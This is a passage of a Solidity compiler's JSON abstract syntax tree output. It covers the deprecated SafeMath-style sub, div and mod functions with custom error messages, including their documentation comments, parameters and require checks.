										"text": "@dev Returns the subtraction of two unsigned integers, reverting with custom message on\noverflow (when the result is negative).\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\nmessage unnecessarily. For custom revert reasons use {trySub}.\n     * Counterpart to Solidity's `-` operator.\n     * Requirements:\n     * - Subtraction cannot overflow."
									},
									"id": 690,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "sub",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 674,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 669,
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 690,
												"src": "5445:9:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 668,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5445:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 671,
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 690,
												"src": "5456:9:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 670,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5456:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 673,
												"name": "errorMessage",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 690,
												"src": "5467:26:1",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 672,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "5467:6:1",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "5444:50:1"
									},
									"returnParameters": {
										"id": 677,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 676,
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 690,
												"src": "5518:7:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 675,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5518:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "5517:9:1"
									},
									"scope": 739,
									"src": "5432:163:1",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 713,
										"nodeType": "Block",
										"src": "6347:67:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 705,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 703,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 695,
																"src": "6365:1:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 704,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "6369:1:1",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "6365:5:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"id": 706,
															"name": "errorMessage",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 697,
															"src": "6372:12:1",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 702,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "6357:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 707,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "6357:28:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 708,
												"nodeType": "ExpressionStatement",
												"src": "6357:28:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 711,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 709,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 693,
														"src": "6402:1:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "/",
													"rightExpression": {
														"argumentTypes": null,
														"id": 710,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 695,
														"src": "6406:1:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "6402:5:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 701,
												"id": 712,
												"nodeType": "Return",
												"src": "6395:12:1"
											}
										]
									},
									"documentation": {
										"id": 691,
										"nodeType": "StructuredDocumentation",
										"src": "5601:646:1",
										"text": "@dev Returns the integer division of two unsigned integers, reverting with custom message on\ndivision by zero. The result is rounded towards zero.\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\nmessage unnecessarily. For custom revert reasons use {tryDiv}.\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\n`revert` opcode (which leaves remaining gas untouched) while Solidity\nuses an invalid opcode to revert (consuming all remaining gas).\n     * Requirements:\n     * - The divisor cannot be zero."
									},
									"id": 714,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "div",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 698,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 693,
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 714,
												"src": "6265:9:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 692,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "6265:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 695,
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 714,
												"src": "6276:9:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 694,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "6276:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 697,
												"name": "errorMessage",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 714,
												"src": "6287:26:1",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 696,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "6287:6:1",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "6264:50:1"
									},
									"returnParameters": {
										"id": 701,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 700,
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 714,
												"src": "6338:7:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 699,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "6338:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "6337:9:1"
									},
									"scope": 739,
									"src": "6252:162:1",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 737,
										"nodeType": "Block",
										"src": "7155:67:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 729,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 727,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 719,
																"src": "7173:1:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 728,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "7177:1:1",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "7173:5:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"id": 730,
															"name": "errorMessage",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 721,
															"src": "7180:12:1",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 726,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "7165:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 731,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "7165:28:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 732,
												"nodeType": "ExpressionStatement",
												"src": "7165:28:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 735,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 733,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 717,
														"src": "7210:1:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "%",
													"rightExpression": {
														"argumentTypes": null,
														"id": 734,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 719,
														"src": "7214:1:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "7210:5:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 725,
												"id": 736,
												"nodeType": "Return",
												"src": "7203:12:1"
											}
										]
									},
									"documentation": {
										"id": 715,
										"nodeType": "StructuredDocumentation",
										"src": "6420:635:1",
										"text": "@dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\nreverting with custom message when dividing by zero.\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\nmessage unnecessarily. For custom revert reasons use {tryMod}.\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\nopcode (which leaves remaining gas untouched) while Solidity uses an\ninvalid opcode to revert (consuming all remaining gas).\n     * Requirements:\n     * - The divisor cannot be zero."
									},
									"id": 738,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "mod",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 722,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 717,
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 738,
												"src": "7073:9:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 716,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "7073:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 719,
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 738,
												"src": "7084:9:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 718,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "7084:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 721,
												"name": "errorMessage",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 738,
												"src": "7095:26:1",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 720,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "7095:6:1",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "7072:50:1"
									},
									"returnParameters": {
										"id": 725,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 724,
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 738,
												"src": "7146:7:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 723,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "7146:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "7145:9:1"
									},
									"scope": 739,
									"src": "7060:162:1",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								}
							],
							"scope": 740,
							"src": "630:6594:1"
						}
					],
					"src": "33:7192:1"
				},
				"id": 1
			}
		}
	}
}